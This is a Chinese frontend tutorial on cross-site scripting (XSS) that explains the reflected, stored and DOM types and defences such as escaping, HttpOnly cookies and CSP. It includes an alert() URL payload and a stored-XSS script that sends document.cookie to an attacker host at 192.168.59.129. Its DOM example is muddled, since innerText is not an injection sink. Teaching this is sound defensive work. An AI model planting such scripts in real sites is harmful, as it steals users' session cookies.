---
meta:
  - name: description
    content: 前端跨站脚本攻击
  - name: keywords
    content: 前端跨站脚本攻击,XSS,前端,攻击,
---
# 跨站脚本攻击

## 介绍

> “XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。”


xss攻击的核心方式是脚本。这些脚本通常是javascript脚本，从这个层面来说javascript能做的事情，xss攻击一般都能做到。比如：

+ 通过 document.cookie 盗取 cookie中的信息

+ 使用 js或 css破坏页面正常的结构与样式

+ 流量劫持（通过访问某段具有 window.location.href 定位到其他页面）

+ dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。并且通过携带过程的 cookie信息可以使服务端返回400开头的状态码，从而拒绝合理的请求服务。

+ 利用 iframe、frame、XMLHttpRequest或上述 Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用 iframe，frame进一步的进行 CSRF 攻击。

+ 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力



## 分类
### 反射型xss
`反射型xss`又被称为`非持久型xss`。当用户访问一个带有xss攻击代码的url请求的时候，向服务器发送请求，服务器接受请求后处理，并把客户端发送的xss攻击代码返回给客户端，客户端解析这段代码的时候，就有可能遭受xss攻击

用户浏览某个网站A，攻击者在这个网站中嵌入了恶意的脚本用于盗取用户的cookie等信息 攻击者诱导用户触发xss攻击（比如诱导用户点击非法链接），当用户触发了xss攻击的时候就会将自己的用户信息发送给攻击者 攻击者在获取用户的cookie后，就有可能盗用用户的身份信息进行非法操作

`http://xxx/search?keyword="><script>alert('XSS');</script>`

**反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等**

数据流向： 浏览器 -> 后端 -> 浏览器


### 存储型xss
`存储型xss`又被称为`持久化的xss`。也是最危险的xss攻击方式。一旦攻击成功，就有可能造成大规模的xss攻击，也就是我们通常所说的xss蠕虫。

存储型xss攻击的一般原理是，客户端将带有xss攻击的数据发送给服务器，服务器接收并存储在数据库。当用户下次再访问这个页面的时候，服务器会读取数据库并将之前的xss代码取出发送给浏览器。浏览器解析这段数据的时候，就会遭受xss攻击。

所以，反射型xss攻击一般需要用户手动触发，而存储型xss攻击却是能够自动触发的。一般来说，反射型xss攻击的危害要比存储型xss攻击的危害要小的多。

```js
// 比如通过评论输入框将下面代码提交，之后会执行下面代码
<script type="text/javascript">
document.write("<img src='http://192.168.59.129:10086?c=" + escape(document.cookie) + "'>")
</script>
```

**存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里**

数据流向： 浏览器 -> 后端 -> 数据库 -> 后端 -> 浏览器



### DOM型xss
我们可以通过JavaScript来操作dom树，所以，xss攻击也是能够做到这一点的。dom型xss攻击最大的危害就是改变我们网页的布局。这种类型的xss是不需要和服务器进行交互的，只发生在客户端处理阶段。比如一段xss攻击的代码是：
```js
const div = document.createElement('div')
div.innerText = 'xss攻击的代码'
document.body.appendChild(div)
```

**反射型xss和dom-xss都需要在url加入js代码才能够触发**


数据流向： URL -> 浏览器

### 对比总结
| 类型 | 反射型 | 存储型 | DOM型 |
| --- | --- | ---| ---|
| 触发过程 | 正常用户访问携带XSS脚本的URL | 1.黑客构造XSS脚本<br/>2.正常用户访问携带XSS脚本的页面 | 正常用户访问携带XSS脚本的URL |
| 数据存储 | URL| 数据库 | URL |
| 谁来输出 | 后端WEB应用程序 | 后端WEB应用程序 | 前端JS |
| 输出位置 | HTTP响应中 | HTTP响应中 | 动态构建DOM节点 |



## 防范措施
应对XSS攻击的主要手段还是编码与过滤两种，`编码`用于将特殊的符号 "<、>、&、'、""进行html转义，而`过滤`则是阻止特定的标记、属性、事件



### 转义html
+ 使用encodeURIComponent对url中的参数进行编码(反射型xss)

+ 服务器接收到数据，在存储到数据库之前，进行转义/过滤

+ 前端接收到服务器传递过来的数据，在展示到页面前，先进行转义/过滤

### HTTP-only Cookie
`HTTP-only`禁止JavaScript读取某些敏感Cookie，攻击者完成XSS注入后也无法窃取此Cookie属性：防止脚本冒充用户提交危险操作

如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，Js 是操作不了的（无法读写这个cookie）

### Content-Security-Policy
在服务端使用HTTP的`Content-Security-Policy`头部来指定策略，或者在前端设置meta标答。例如下面的配置只允许加载同域下的资源

### innerText/textContent
+ 在使用 `.innerHTML、.outerHTML、document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等

+ 如果用 Vue/React 技术栈，并且不使用 `v-html/dangerouslySetInnerHTML` 功能，就在前端 render 阶段避免 `innerHTML、outerHTML` 的 XSS 隐患


### 验证码
防止脚本冒充用户提交危险操作


## 参考资料
[什么是XSS攻击，XSS攻击可以分为哪几类？如何防范XSS攻击？](https://github.com/YvetteLau/Step-By-Step/issues/18)

[web安全之xss攻击](https://zhaosaisai.com/blog/2018/web%E5%AE%89%E5%85%A8%E4%B9%8Bxss%E6%94%BB%E5%87%BB.html)






